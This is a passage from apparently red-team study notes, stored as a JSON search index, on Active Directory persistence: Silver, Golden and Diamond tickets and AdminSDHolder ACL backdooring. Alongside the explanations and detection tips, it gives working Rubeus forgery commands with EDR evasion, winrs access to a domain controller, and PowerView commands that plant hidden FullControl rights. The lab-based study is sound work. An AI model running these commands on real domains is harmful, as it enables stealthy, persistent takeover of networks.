service account’s NTLM hash so it looks valid to the service ✅ 3. Attacker presents this forged ticket directly to the target service Since the service can decrypt and validate the ticket (it trusts its own key), access is granted! ✅ 4. No communication with Domain Controller is required during usage So detection is harder because no logon event is generated at the DC."},{"id":"commonly-target-services-in-silver-ticket","u":"03_persistence.html#commonly-target-services-in-silver-ticket","sec":"Persistence","lvl":3,"t":"Commonly Target Services in Silver Ticket:","c":"SPN | Service Type | What It Enables (via Silver Ticket) | — | — | — | CIFS | SMB (File System) | Access to network file shares , remote file copy (e.g., via net use , dir \\\\host\\share ) | HOST | Generic Windows Service SPN | Grants access to WinRM , Remote Desktop , Task Scheduler , Service Control Manager (SCM), etc. | RPCSS | Remote Procedure Call Service | Enables WMI access , remote DCOM , and some ActiveX interactions | HTTP | Web-based services | Used by PowerShell Remoting , WinRM , OWA, IIS apps — anything over HTTP/HTTPS | 💡 Bonus Tip: Many SPNs are tied to the computer account (hostname$) — so if you dump a machine’s hash, you can often target all these services on that host with forged Silver Tickets. Most service accounts are AD user accounts with SPNs registered, which differentiates them from normal user accounts."},{"id":"one-subtle-thing-many-people-miss","u":"03_persistence.html#one-subtle-thing-many-people-miss","sec":"Persistence","lvl":3,"t":"⚡ One subtle thing many people miss","c":"Silver Tickets can impersonate users that don’t even exist . Example: 👤 fakeadmin If PAC says: 👥 Domain Admin Service will still accept it. Because it trusts the PAC inside the ticket."},{"id":"persistance-peroid-of-golden-ticket","u":"03_persistence.html#persistance-peroid-of-golden-ticket","sec":"Persistence","lvl":3,"t":"🔍 Persistance Peroid of Golden Ticket","c":""},{"id":"silver-ticket-persistence","u":"03_persistence.html#silver-ticket-persistence","sec":"Persistence","lvl":3,"t":"Silver Ticket Persistence","c":"A Silver Ticket is forged using the NTLM hash of a service account or computer account (not krbtgt )."},{"id":"persistence-2","u":"03_persistence.html#persistence-2","sec":"Persistence","lvl":4,"t":"Persistence:","c":"As long as the service account’s password (or machine account password) remains unchanged . Service accounts: Many organizations set them with “Password never expires” , so a Silver Ticket could last indefinitely. Machine accounts: By default, Windows rotates machine account passwords every 30 days , so Silver Ticket persistence for computer accounts is typically ~30 days. But for user-based service accounts (often set to “never expire”), persistence can be much longer."},{"id":"limitations","u":"03_persistence.html#limitations","sec":"Persistence","lvl":3,"t":"🚫 Limitations","c":"Works only for that service on that system (scoped). If the service enforces PAC validation (with KDC), the forged ticket will fail. You need the exact SPN and hash of the service account. If the service logs user access or performs detailed auditing, the fake identity might be suspicious."},{"id":"detection-and-defense-tips-for-blue-teams","u":"03_persistence.html#detection-and-defense-tips-for-blue-teams","sec":"Persistence","lvl":3,"t":"🛡️ Detection and Defense Tips (for Blue Teams)","c":"Event ID 4624 on the target machine with unexpected usernames. PAC validation failures (Event ID 4769 with KDC_ERR_PADATA_TYPE_NOSUPP). Monitor for tickets used without a matching request to the KDC . Service logs showing high-privilege users accessing them in unusual ways."},{"id":"how-the-attack-works---logic","u":"03_persistence.html#how-the-attack-works---logic","sec":"Persistence","lvl":3,"t":"How the attack works ?? - Logic","c":""},{"id":"how-it-works-internally","u":"03_persistence.html#how-it-works-internally","sec":"Persistence","lvl":3,"t":"⚙️ How it Works Internally","c":""},{"id":"valid-service-ticket-tgs","u":"03_persistence.html#valid-service-ticket-tgs","sec":"Persistence","lvl":3,"t":"1. Valid Service Ticket (TGS)","c":"A Service Ticket (TGS) is normally issued by the KDC (Domain Controller) for a specific service that the user wants to access. Normal Kerberos Flow 👤 User → Requests access to a service (Example: SMB on DC01) 👤 User → asks KDC for a service ticket for that service 🧠 KDC verifies the user’s TGT and then creates a TGS The generated ticket contains: 📦 Ticket Content • User identity • User SID • Group memberships • Privileges • Logon metadata This authorization block is called: 📜 PAC (Privilege Attribute Certificate) After creating the ticket: 🧠 KDC 🔐 Encrypts the ticket using the service account key Example Service → CIFS/DC01 Service account → DC01$ So the ticket is encrypted using: 🔑 DC01$ password hash The ticket is then returned to the user. 👤 User ➡️ Presents ticket directly to the service 🖥️ Service decrypts it and grants access. Silver Ticket Concept Instead of requesting a ticket from the KDC: ⚠️ Attacker creates the ticket offline Because the attacker already has: 🔑 Service account NTLM/Kerberos key So the attacker becomes capable of generating a valid-looking service ticket without contacting the KDC."},{"id":"encryption-signing","u":"03_persistence.html#encryption-signing","sec":"Persistence","lvl":3,"t":"2. Encryption / Signing","c":"Kerberos uses symmetric encryption to protect tickets. Important rule of Kerberos: 🔑 Whoever owns the service key can produce a valid ticket for that service This is because the service validates tickets using its own key . Service validation process: 🖥️ Service receives ticket ⬇ Attempts decryption using its key If decryption works: ✔ Ticket assumed valid ✔ Ticket assumed issued by the KDC So if an attacker possesses: 🔑 Service account hash They can generate a ticket that the service will successfully decrypt. Example Service → HTTP/dcorp-dc Account → DC computer account Attacker with the computer account hash can forge a valid HTTP service ticket . Because the encryption key matches, the service trusts the ticket."},{"id":"pac-privileged-attribute-certificate","u":"03_persistence.html#pac-privileged-attribute-certificate","sec":"Persistence","lvl":3,"t":"3. PAC (Privileged Attribute Certificate)","c":"Inside every Kerberos ticket is the PAC . The PAC contains authorization information , including: 👤 Username 🆔 User SID 👥 Group memberships ⚡ Privileges Example PAC content User → attacker Groups → • Domain Users • Domain Admins • Enterprise Admins Important Kerberos Behavior When the KDC creates the PAC : 🧠 KDC signs the PAC However when the service receives the ticket : 🖥️ Service usually does not validate the PAC with the KDC Instead the service performs: 1️⃣ Decrypt ticket 2️⃣ Extract PAC 3️⃣ Apply privileges So if the attacker forges a PAC containing: ⚠️ Domain Admin privileges The service will accept it as long as the ticket decrypts correctly . This design choice exists because validating PAC with the DC for every authentication would create significant performance overhead . Because of that design: ➡️ Services often trust the PAC blindly ➡️ Which makes Silver Tickets effective"},{"id":"scope-of-access","u":"03_persistence.html#scope-of-access","sec":"Persistence","lvl":3,"t":"4. Scope of Access","c":"A Silver Ticket only works for the specific service whose key was used. Reason: 🔐 Ticket encryption must match the service account key Example Forged ticket created for: 🎯 CIFS/DC01 Access granted to: 📂 SMB file shares 📂 Administrative shares But if the attacker attempts to use that same ticket for: ❌ LDAP/DC01 ❌ WinRM/DC01 ❌ MSSQL/DC01 It fails because those services use different encryption keys . So the scope is limited to: 🎯 one service → one server Example scopes Forged Ticket | Access Granted | — | — | CIFS/DC01 | SMB shares | HOST/DC01 | WMI / scheduled tasks | HTTP/WEB01 | Web authentication | MSSQL/DB01 | Database access | This is why Silver Tickets are service-scoped , unlike Golden Tickets which affect the entire domain ."},{"id":"persistence-3","u":"03_persistence.html#persistence-3","sec":"Persistence","lvl":3,"t":"5. Persistence","c":"Silver Ticket persistence depends on the service account password lifetime . Common scenarios: 🖥️ Machine accounts • Password rotates automatically • Default rotation ≈ 30 days After password rotation: 🔑 Old service hash becomes invalid 🎫 Previously forged tickets stop working However many environments use: 👤 Manual service accounts Examples sqlsvc backupsrv websvc These accounts often have: ⚠️ Static passwords ⚠️ No rotation for years If a Silver Ticket is forged using such an account: ➡️ Persistence can last months or years"},{"id":"core-security-weakness","u":"03_persistence.html#core-security-weakness","sec":"Persistence","lvl":3,"t":"🔑 Core Security Weakness","c":"Silver Tickets work because of two Kerberos design assumptions: 1️⃣ Services trust tickets that decrypt correctly 2️⃣ Services often do not validate PAC with the KDC So if an attacker knows: 🔑 Service account key They effectively become: ⚠️ the ticket issuer for that service"},{"id":"pac-validation","u":"03_persistence.html#pac-validation","sec":"Persistence","lvl":3,"t":"Pac Validation","c":""},{"id":"who-the-tgs-belongs-to","u":"03_persistence.html#who-the-tgs-belongs-to","sec":"Persistence","lvl":3,"t":"🧠 Who the TGS “belongs” to","c":"A TGS (service ticket) is created by the KDC , but it is meant for a specific service . Think of it like this: 🧠 KDC → creates ticket 🎫 Ticket → addressed to a service 🖥️ Service → is the only one who can decrypt it Why? Because the ticket is encrypted with: 🔑 service account key Example: Service: CIFS/DC01 Account: DC01$ So: 🧠 KDC encrypts ticket using → DC01$ key Then: 👤 Client sends ticket → 🖥️ DC01 Only DC01 can decrypt it."},{"id":"where-the-pac-comes-from","u":"03_persistence.html#where-the-pac-comes-from","sec":"Persistence","lvl":3,"t":"📦 Where the PAC comes from","c":"Yes — the PAC is inserted by the KDC when it creates the ticket. PAC contains: 👤 User identity 🆔 SID 👥 Group memberships ⚡ Privileges So the ticket looks conceptually like: 🎫 Service Ticket ┣ 🔐 Encrypted part (for service) ┃ ┣ 📦 PAC ┃ ┣ User SID ┃ ┣ Groups ┃ ┗ Privileges"},{"id":"what-happens-in-a-silver-ticket","u":"03_persistence.html#what-happens-in-a-silver-ticket","sec":"Persistence","lvl":3,"t":"⚠️ What happens in a Silver Ticket","c":"The attacker does not ask the KDC . Instead: 👤 Attacker ➡️ creates fake ticket offline Because attacker already knows: 🔑 service account hash So the attacker can: ✔ build a ticket ✔ insert a fake PAC ✔ encrypt the ticket using the service key Now the service receives it: 🖥️ Service ⬇ decrypts ticket successfully ⬇ reads PAC ⬇ applies privileges Since the ticket decrypted correctly, the service assumes: ✔ ticket came from the KDC"},{"id":"now-your-question-pac-validation","u":"03_persistence.html#now-your-question-pac-validation","sec":"Persistence","lvl":3,"t":"🔍 Now your question: PAC validation","c":"Some services can do PAC validation with the KDC . Flow becomes: 🖥️ Service receives ticket ⬇ decrypts ticket ⬇ reads PAC ⬇ contacts KDC to verify PAC signature"},{"id":"what-happens-if-the-pac-was-forged","u":"03_persistence.html#what-happens-if-the-pac-was-forged","sec":"Persistence","lvl":3,"t":"🚨 What happens if the PAC was forged","c":"If attacker modified the PAC: 📦 PAC contents ≠ KDC signature So when service asks the KDC: 🖥️ Service → 🧠 KDC “Is this PAC valid?” KDC checks: ✔ PAC signature ✔ integrity Since attacker does not have the KDC signing key : ❌ PAC verification fails Result: 🚫 Authentication rejected"},{"id":"why-silver-tickets-often-still-work","u":"03_persistence.html#why-silver-tickets-often-still-work","sec":"Persistence","lvl":3,"t":"🔑 Why Silver Tickets often still work","c":"Because in many cases: 🖥️ Service does NOT ask the KDC Instead it does: decrypt ticket ✔ trust PAC ✔ grant privileges ✔ So the forged PAC is never checked . That’s the key weakness."},{"id":"the-important-keys-in-kerberos","u":"03_persistence.html#the-important-keys-in-kerberos","sec":"Persistence","lvl":3,"t":"⚡ The Important Keys in Kerberos","c":"There are two different keys involved , which is why this works. Service ticket encryption 🔑 Service account key PAC signature 🔑 KDC key Attacker with only the service key can: ✔ encrypt the ticket ✔ make the service accept it But attacker cannot produce a valid PAC signature , which is why PAC validation would stop the attack ."},{"id":"windows-example---poc","u":"03_persistence.html#windows-example---poc","sec":"Persistence","lvl":3,"t":"Windows Example - PoC","c":""},{"id":"step-by-step-exploitation","u":"03_persistence.html#step-by-step-exploitation","sec":"Persistence","lvl":2,"t":"⚔️ Step-by-Step Exploitation","c":""},{"id":"step-1-get-domain-sid","u":"03_persistence.html#step-1-get-domain-sid","sec":"Persistence","lvl":3,"t":"Step 1: Get Domain SID","c":"Use whoami /user or Rubeus: whoami /user S-1-5-21-719815819-3726368948-3917688648-1001 -> User SID S-1-5-21-719815819-3726368948-3917688648 -> Domain SID"},{"id":"step-2-obtain-ntlm-hash-of-service-account","u":"03_persistence.html#step-2-obtain-ntlm-hash-of-service-account","sec":"Persistence","lvl":3,"t":"Step 2: Obtain NTLM Hash of Service Account","c":"Suppose you’ve dumped credentials using DCSync, LSASS, or secretsdump: db1$:aad3b435b51404eeaad3b435b51404ee:6e58e06e07588123319fe02feeab775d::: We need the RC4/NTLM hash: 6e58e06e07588123319fe02feeab775d"},{"id":"step-3-identify-target-spn","u":"03_persistence.html#step-3-identify-target-spn","sec":"Persistence","lvl":3,"t":"Step 3: Identify Target SPN","c":"Service running is MSSQL, target server is db1 . SPN becomes: MSSQLSvc/db1.dollarcorp.moneycorp.local"},{"id":"step-4-forge-silver-ticket","u":"03_persistence.html#step-4-forge-silver-ticket","sec":"Persistence","lvl":3,"t":"Step 4: Forge Silver Ticket","c":"Use Rubeus to forge the Silver Ticket: Rubeus.exe silver /service:MSSQLSvc/db1.dollarcorp.moneycorp.local \\ /rc4:6e58e06e07588123319fe02feeab775d \\ /sid:S-1-5-21-719815819-3726368948-3917688648 \\ /user:Administrator \\ /domain:dollarcorp.moneycorp.local \\ /ptt OR **#prefered** C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local \\ /rc4:6e58e06e07588123319fe02feeab775d \\ /sid:S-1-5-21-719815819-3726368948-3917688648 \\ /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt ✅ This creates a forged service ticket for the MSSQL service, impersonating Administrator, signed with the service account’s hash, and injects it into memory. Part | Purpose | — | — | /service:http/dcorp-dc... | The SPN (Service Principal Name) for which the forged ticket is being created. In this case, it’s an HTTP service on the domain controller machine. | /rc4:<hash> | The NTLM hash of the service account (in this case, probably the computer account of dcorp-dc ). It is used to encrypt and sign the forged service ticket. | /sid:<domain SID> | The SID of the domain . Required for crafting the user’s authorization data (PAC). | /user:Administrator | The impersonated user for the forged ticket. You’re pretending to be Administrator . | /domain:<domain FQDN> | The target domain. | /ptt | “ Pass-the-ticket ”: directly injects the crafted ticket into memory. | /ldap | Optional(Use only if you are forging ticket for DC service account): After forging the ticket, Rubeus performs an LDAP query to the Domain Controller , using the forged identity to fetch user attributes, group membership, etc. | While forging silver ticket we mostly use RC4(NTLM) Key of the service not the AES key, because mostly of the service accounts still use RC4 instead of AES. image.png above hashes are got by dumping the lsass of DC, steps shown in golden ticket attack. image.png Now you can view whether the ticket has been generated and imported in session using klist command. But some heavily monitored EDRs have problem with klist command so to avoid this you can use rubeus klist option: C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args klist image.png image.png"},{"id":"step-5-access-the-mssql-service","u":"03_persistence.html#step-5-access-the-mssql-service","sec":"Persistence","lvl":3,"t":"Step 5: Access the MSSQL Service","c":"Now, you can connect to MSSQL (using tools like sqlcmd , PowerUpSQL, or AD module) as Administrator . sqlcmd -S db1.dollarcorp.moneycorp.local 🎯 You’ll be granted access with Administrator rights , since the service reads the ticket and sees: “This is from user Administrator” — and it was signed properly (with its own key), so it trusts it. OR Accessing DC as we have Service ticket of DC in previous step: As we have got http service ticket so we can access dc using winrs: winrs -r:dcorp.dollarcorp.moneycorp.local cmd image.png As the ticket is for http service only so when we try to list C$ on DC, we get error message because we don’t service ticket for CIFS service. image.png"},{"id":"difference-between-golden-silver-diamond","u":"03_persistence.html#difference-between-golden-silver-diamond","sec":"Persistence","lvl":2,"t":"Difference Between Golden Silver & Diamond","c":""},{"id":"golden-ticket-no-as-req-trail","u":"03_persistence.html#golden-ticket-no-as-req-trail","sec":"Persistence","lvl":3,"t":"🟡 Golden Ticket – No AS-REQ Trail","c":"A Golden Ticket is created completely offline using the krbtgt account hash . Normal Kerberos login flow 1️⃣ User authenticates to the DC ➡️ sends AS-REQ (Authentication Service Request) 2️⃣ DC responds ➡️ AS-REP containing the TGT 3️⃣ User uses that TGT later to request service tickets. So the Domain Controller normally logs: 📜 Event 4768 — TGT issued What happens in a Golden Ticket attack In a Golden Ticket scenario: 👤 Attacker 🔧 forges a TGT offline Because they already know: 🔑 krbtgt key So the attacker skips the entire AS-REQ stage . Flow becomes: 👤 Attacker ➡️ uses forged TGT directly to request services From the DC’s perspective: ❌ No AS-REQ happened ❌ No TGT was issued But suddenly the attacker requests services using a TGT that the DC never created . So logs look like: ⚠️ Service ticket requests appear ⚠️ But no earlier TGT issuance This gap is suspicious for defenders. That’s what people mean by: ➡️ “Golden Ticket leaves no AS-REQ trail.”"},{"id":"diamond-ticket-uses-a-legitimate-tgt","u":"03_persistence.html#diamond-ticket-uses-a-legitimate-tgt","sec":"Persistence","lvl":3,"t":"🔵 Diamond Ticket – Uses a Legitimate TGT","c":"A Diamond Ticket works differently. Instead of forging the TGT entirely, the attacker: 1️⃣ Authenticates normally to the DC 2️⃣ Receives a legitimate TGT 3️⃣ Decrypts it locally 4️⃣ Modifies the PAC / privileges 5️⃣ Re-signs it using the krbtgt key So the flow becomes: 👤 Attacker ➡️ normal login ➡️ DC issues TGT The DC logs: 📜 Event 4768 (TGT issued) Then the attacker modifies that TGT after receiving it . From the DC’s perspective: ✔ TGT request exists ✔ timestamps look valid ✔ authentication looks normal So there is no obvious missing event . That’s why people say: ➡️ Diamond Tickets have valid timestamps and log evidence."},{"id":"simple-mental-model","u":"03_persistence.html#simple-mental-model","sec":"Persistence","lvl":3,"t":"🎯 Simple Mental Model","c":"Golden Ticket 🧠 DC never issued the TGT 🎫 Attacker fabricated it 🚨 Missing authentication logs Diamond Ticket 🧠 DC really issued the TGT 🔧 Attacker modified it later 👀 Logs look legitimate"},{"id":"kerberos-ticket-attacks-difference-quick-mental-map","u":"03_persistence.html#kerberos-ticket-attacks-difference-quick-mental-map","sec":"Persistence","lvl":3,"t":"🧠 Kerberos Ticket Attacks Difference – Quick Mental Map","c":"Attack | What is forged/modified | Key required | Contact with DC | — | — | — | — | Silver Ticket | TGS (service ticket) | Service account hash | ❌ Not required | Golden Ticket | TGT forged from scratch | krbtgt hash | ❌ Not required | Diamond Ticket | Legitimate TGT modified | krbtgt hash | ✔ Required initially |"},{"id":"golden-ticket","u":"03_persistence.html#golden-ticket","sec":"Persistence","lvl":3,"t":"🥇 Golden Ticket","c":"Attack idea: ➡️ Create a fake TGT completely offline Requirements: 🔑 krbtgt account hash Why? Because the Kerberos Domain Controller signs all TGTs with the krbtgt key . So attacker does: 🛠 Forge TGT 📦 Insert PAC (Domain Admin etc.) 🔏 Sign with krbtgt key Then use it like a real TGT: 👤 Attacker ➡️ TGS-REQ → DC DC verifies signature → looks valid → issues service ticket. Key characteristic: ❌ No AS-REQ ever happened The TGT was never issued by the DC."},{"id":"silver-ticket","u":"03_persistence.html#silver-ticket","sec":"Persistence","lvl":3,"t":"🥈 Silver Ticket","c":"Attack idea: ➡️ Forge the service ticket instead of the TGT Requirements: 🔑 service account hash Example services: CIFS/DC01 • MSSQLSvc/db01 • HTTP/web01 Flow: 👤 Attacker 🛠 Forge TGS Then present it directly to the service: 👤 Attacker → 🖥️ Service Important: ❌ Domain Controller is never contacted. The service just decrypts the ticket using its own key and trusts it."},{"id":"diamond-ticket","u":"03_persistence.html#diamond-ticket","sec":"Persistence","lvl":3,"t":"💎 Diamond Ticket","c":"Diamond Ticket sits between Golden and normal Kerberos . Instead of creating a fake TGT: ➡️ Attacker gets a real TGT from the DC first Steps: 1️⃣ Attacker authenticates normally 2️⃣ DC issues a legitimate TGT 3️⃣ Attacker decrypts it locally 4️⃣ Modifies the PAC (privileges) 5️⃣ Re-signs it using krbtgt key Now attacker uses the modified ticket. Key characteristics: ✔ TGT actually came from DC ✔ Valid timestamps ✔ Legitimate AS-REQ exists in logs So logs look normal."},{"id":"visual-comparison","u":"03_persistence.html#visual-comparison","sec":"Persistence","lvl":3,"t":"🔎 Visual Comparison","c":"Normal Kerberos User → AS-REQ → DC DC → TGT issued Golden Ticket Attacker → forge TGT offline No AS-REQ. Diamond Ticket Attacker → AS-REQ → DC DC → legitimate TGT Attacker → modifies TGT Silver Ticket Attacker → forge TGS Attacker → directly to service DC never involved."},{"id":"one-line-summary","u":"03_persistence.html#one-line-summary","sec":"Persistence","lvl":3,"t":"🎯 One-line summary","c":"Golden Ticket ➡️ Fake TGT Silver Ticket ➡️ Fake service ticket Diamond Ticket ➡️ Real TGT but modified"},{"id":"golden-vs-silver-vs-diamond-quick-table","u":"03_persistence.html#golden-vs-silver-vs-diamond-quick-table","sec":"Persistence","lvl":3,"t":"🥇 Golden vs Silver vs Diamond (Quick Table)","c":"Attack | Uses Hash | Forged Part | Scope | Stealth | — | — | — | — | — | Silver Ticket | Service account hash | TGS only | One service on one machine | ⭐⭐ Very stealthy | Golden Ticket | KRBTGT hash | Entire TGT | Entire domain | ⭐ Medium | Diamond Ticket | KRBTGT hash + normal creds | PAC inside real TGT | Entire domain | ⭐⭐⭐ Most stealthy |"},{"id":"persistence-using-acl--adminsdholder---domain-persistence","u":"03_persistence.html#persistence-using-acl--adminsdholder---domain-persistence","sec":"Persistence","lvl":2,"t":"Persistence using ACL -AdminSDHolder - Domain Persistence","c":""},{"id":"understanding-the-core-concept-3","u":"03_persistence.html#understanding-the-core-concept-3","sec":"Persistence","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-adminsdholder","u":"03_persistence.html#what-is-adminsdholder","sec":"Persistence","lvl":4,"t":"🔐 What is AdminSDHolder?","c":"AdminSDHolder is a special security object in Active Directory located in CN=System,DC=domain,DC=com . Its main purpose is to define and protect the Access Control Lists (ACLs) of a set of high-privilege accounts and groups in Active Directory called Protected Groups .— like Domain Admins or Enterprise Admins . Think of it like this: “Whatever permissions are set on AdminSDHolder will be copied to all the VIP accounts (called protected accounts) regularly.”"},{"id":"what-are-protected-groups","u":"03_persistence.html#what-are-protected-groups","sec":"Persistence","lvl":4,"t":"🧱 What Are Protected Groups?","c":"These groups are considered high-value targets and include: Group Name | Privilege Level | — | — | Domain Admins | Full control of domain | Enterprise Admins | Full control of forest | Schema Admins | Modify schema | Administrators | Local admin on all DCs | Account Operators | User/group management | Backup Operators | Backup/restore privilege | Server Operators | Admin services on DC | Print Operators | Load drivers (code execution) | Replicator | Replication permission | Domain Controllers | All DC computer objects | Read-Only Domain Controllers | Read-only DCs | These accounts are sensitive and thus protected from unauthorized ACL changes."},{"id":"what-is-the-sdprop-process","u":"03_persistence.html#what-is-the-sdprop-process","sec":"Persistence","lvl":4,"t":"🔁 What is the SDProp Process?","c":"SDProp = Security Descriptor Propagator , a built-in process that runs every 60 minutes by default on the PDC Emulator . SDProp compares the ACL of AdminSDHolder with the ACLs of each protected group and its members . If there’s a difference, SDProp overwrites the ACLs of protected objects with that of AdminSDHolder. This includes users who are members of protected groups , even nested members. ➡️ ACLs of protected users get reset every hour to match AdminSDHolder ."},{"id":"structure","u":"03_persistence.html#structure","sec":"Persistence","lvl":4,"t":"📂 Structure","c":"DC=domain,DC=local │ ├── OU=IT │ ├── john (user) │ ├── pc1 (computer) │ ├── OU=Admins │ ├── admin1 (Domain Admin) │ ├── CN=System │ └── CN=AdminSDHolder ← ⭐ IMPORTANT"},{"id":"admincount-1-very-important-concept","u":"03_persistence.html#admincount-1-very-important-concept","sec":"Persistence","lvl":4,"t":"🧠 2. adminCount = 1 (Very Important Concept)","c":"❓ Your Question “Does adminCount = 1 mean object is protected by AdminSDHolder?” ✅ Short Answer adminCount = 1 ⇒ YES, the object is (or was) protected"},{"id":"full-explanation","u":"03_persistence.html#full-explanation","sec":"Persistence","lvl":4,"t":"🧠 Full Explanation","c":"🔐 What happens when a user becomes privileged? Example: john → added to Domain Admins 🔄 AD does: adminCount = 1 Inheritance = disabled ACL replaced by AdminSDHolder template 🔑 Meaning of adminCount adminCount = 1 = Flag indicating SDProp protection applies Example:- If you compromise a Domain Controller and have Domain Admin rights, you can go to the properties of the Domain Admins group and add a user ( e.g., student2 ) to the Security/Permissions tab (which contains all the ACLs), giving them FullControl over the group. image.png Although eviluser is not an actual member of the Domain Admins group, it can still fully control the group due to the permission he has. image.png The above examples showes that the add user student2 is not the part of domain admin group but still has full rights However, because Domain Admins is a protected group , the SDProp process will run every 60 minutes on the PDC Emulator and overwrite the ACL of the Domain Admins group by copying the ACL from the AdminSDHolder object . As a result, the custom permission given to student2 will be removed , and the ACL will be reset to its default protected state , thereby removing student2 ’s control over the Domain Admins group. To bypass this automatic cleanup , an attacker can instead modify the ACL of the AdminSDHolder object itself and add student2 with FullControl there. Since AdminSDHolder is not reset by SDProp , this change persists , and every time SDProp runs, it will copy the modified ACL to all protected groups and users — thereby granting student2 persistent and hidden control over high-privileged accounts without needing group membership . Adding user to AdminSDHolder: image.png SDProp overwritting the ACL of all the protected groups by copying from AdminSDHolder, ultimately adding the user to the ACL of the Domain Admin groups(now student 2 will be added to all protect groups - ACLs): image.png"},{"id":"persistence-via-adminsdholder-abuse","u":"03_persistence.html#persistence-via-adminsdholder-abuse","sec":"Persistence","lvl":4,"t":"💥 Persistence via AdminSDHolder Abuse","c":"If you gain Domain Admin privileges , you can modify the ACL of the AdminSDHolder object to backdoor access ."},{"id":"attack-goals","u":"03_persistence.html#attack-goals","sec":"Persistence","lvl":4,"t":"🎯 Attack Goals:","c":"Get FullControl / WriteDACL / WriteOwner rights to privileged accounts (without being a visible group member). Survive group membership cleanup or blue team detection ."},{"id":"how-attackers-abuse-adminsdholder","u":"03_persistence.html#how-attackers-abuse-adminsdholder","sec":"Persistence","lvl":4,"t":"🧠 How Attackers Abuse AdminSDHolder","c":"🧠 Goal: Grant student1 persistent, hidden access (like FullControl, ResetPassword, or WriteMembers) on protected groups (like Domain Admins ) by modifying the AdminSDHolder object, and force SDProp to apply those changes immediately."},{"id":"step-by-step-breakdown","u":"03_persistence.html#step-by-step-breakdown","sec":"Persistence","lvl":4,"t":"🔐 Step-by-Step Breakdown:","c":"✅ Step 1: Add student1 to the ACL of AdminSDHolder (Persistence Setup) 🛠️ Using PowerView (as Domain Admin): Add-DomainObjectAcl ` -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' ` -PrincipalIdentity student1 ` -Rights All ` -PrincipalDomain dollarcorp.moneycorp.local ` -TargetDomain dollarcorp.moneycorp.local ` -Verbose 🔹 This gives student1 FullControl on AdminSDHolder . 🔁 Which means: Every 60 minutes , SDProp will copy these permissions to: Domain Admins Enterprise Admins Schema Admins And all protected users 🔥 student1 now has full rights to all of them without being in any group. ✅ Alternative: Use RACE Toolkit + ActiveDirectory Module Set-DCPermissions ` -Method AdminSDHolder ` -SAMAccountName student1 ` -Right GenericAll ` -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' ` -Verbose 🔹 This also adds GenericAll (same as FullControl) for student1 on AdminSDHolder. ✅ Step 2 (Optional): Give Specific Permissions (e.g., ResetPassword, WriteMembers) Instead of FullControl, you can grant specific rights: ResetPassword: WriteMembers (i.e., modify group memberships): Add-DomainObjectAcl ` -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' ` -PrincipalIdentity student1 ` -Rights ResetPassword ` -PrincipalDomain dollarcorp.moneycorp.local ` -TargetDomain dollarcorp.moneycorp.local ` -Verbose Add-DomainObjectAcl ` -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' ` -PrincipalIdentity student1 ` -Rights WriteMembers ` -PrincipalDomain dollarcorp.moneycorp.local ` -TargetDomain dollarcorp.moneycorp.local ` -Verbose"},{"id":"step-3-force-sdprop-immediately-instead-of-waiting-60-mins","u":"03_persistence.html#step-3-force-sdprop-immediately-instead-of-waiting-60-mins","sec":"Persistence","lvl":4,"t":"⏱️ Step 3: Force SDProp Immediately (Instead of Waiting 60 Mins)","c":"Run this on the PDC Emulator to force SDProp now: For Server 2008 and later: Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose For Pre-2008 systems: Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose 🔁 This forces AdminSDHolder’s ACL to be applied to all protected users and groups immediately . 🔍 Step 4: Verify if student1 Got Added to Domain Admins ACL Now you check if student1 is present in the ACL of Domain Admins : 🧰 Using PowerView (normal user): Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ } | ? { $_.IdentityName -match \"student1\" } 🧰 Using ActiveDirectory Module: (Get-Acl -Path 'AD:\\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ? { $_.IdentityReference -match 'student1' } ✅ If the output shows entries for student1 , it means SDProp has applied AdminSDHolder’s ACL to Domain Admins ."},{"id":"summary","u":"03_persistence.html#summary","sec":"Persistence","lvl":4,"t":"🧠 Summary:","c":"Step | Action | Result | — | — | — | 1️⃣ | Add student1 to AdminSDHolder ACL | Sets up persistence | 2️⃣ | Assign FullControl or granular permissions | student1 gains stealthy control | 3️⃣ | Run Invoke-SDPropagator | Forces the ACL to replicate | 4️⃣ | Verify on Domain Admins or others | Confirms persistence works | This technique is used by advanced red teamers and APT actors to maintain stealthy, long-term access without group membership."},{"id":"real-world-abuses-by-protected-groups-for-lateral-movement-persistence","u":"03_persistence.html#real-world-abuses-by-protected-groups-for-lateral-movement-persistence","sec":"Persistence","lvl":4,"t":"🛠️ Real-World Abuses by Protected Groups (for lateral movement / persistence)","c":"🧪 Examples: Group | Abuse | — | — | Account Operators | Can’t modify DA/EA, but can manipulate nested groups and reset passwords. | Backup Operators | Can backup GPO , modify it to include backdooruser , and restore it — even to DA group . | Server Operators | Can start services as SYSTEM on DC (Browser service) = code execution . | Print Operators | Can load device drivers (signed ones) = kernel-level access or copy ntds.dit via shadow copies. |"},{"id":"advanced-abuse","u":"03_persistence.html#advanced-abuse","sec":"Persistence","lvl":4,"t":"💥 Advanced Abuse","c":"With WriteDACL on Domain Admins, an attacker can: Add ACE that grants “GenericAll” or “WriteMember” . Or just reset the DACL to default , removing all detection barriers. Even if the user is removed from Domain Admins group, they still control the group via ACL ."},{"id":"how-to-detect-adminsdholder-acl-abuse","u":"03_persistence.html#how-to-detect-adminsdholder-acl-abuse","sec":"Persistence","lvl":4,"t":"🧹 How to Detect AdminSDHolder ACL Abuse","c":"🛡️ Detection: Use BloodHound to identify users with dangerous ACL rights. Check AdminSDHolder ACL manually or with: Get-ACL \"AD:\\CN=AdminSDHolder,CN=System,DC=domain,DC=com\" Get-DomainObjectAcl (PowerView) 📍Indicators: Users not in DA/EA but have GenericAll on 